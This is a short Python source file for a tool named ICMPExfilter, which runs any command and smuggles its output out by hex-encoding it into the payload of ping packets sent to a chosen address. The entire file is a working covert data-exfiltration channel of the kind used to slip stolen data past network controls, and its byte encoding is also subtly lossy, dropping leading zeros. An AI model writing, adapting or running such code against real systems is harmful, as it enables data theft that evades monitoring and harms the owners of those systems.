from subprocess import PIPE, call, Popen


class ICMPExfilter():
    """
    Redirects any application's stdout through ICMP requests.
    """

    def __init__(self, command_list):
        self.command_list = command_list
        self.result = Popen(command_list, stdout=PIPE)
        self.packets_list = []
        self.padding_lenght = 16

    def __create_packets__(self):
        buf = 0
        packet = ""
        for line in self.result.stdout:
            for char in line:
                if buf > self.padding_lenght:
                    buf = 0
                    self.packets_list.append(packet)
                    packet = ""
                packet += hex(char).split("0x")[1]
                buf += 1
        # LAST PACKET
        self.packets_list.append(packet)

    def send_to(self, addr):
        self.__create_packets__()
        for packet in self.packets_list:
            call(["ping", "-c 1", "-p", packet, addr])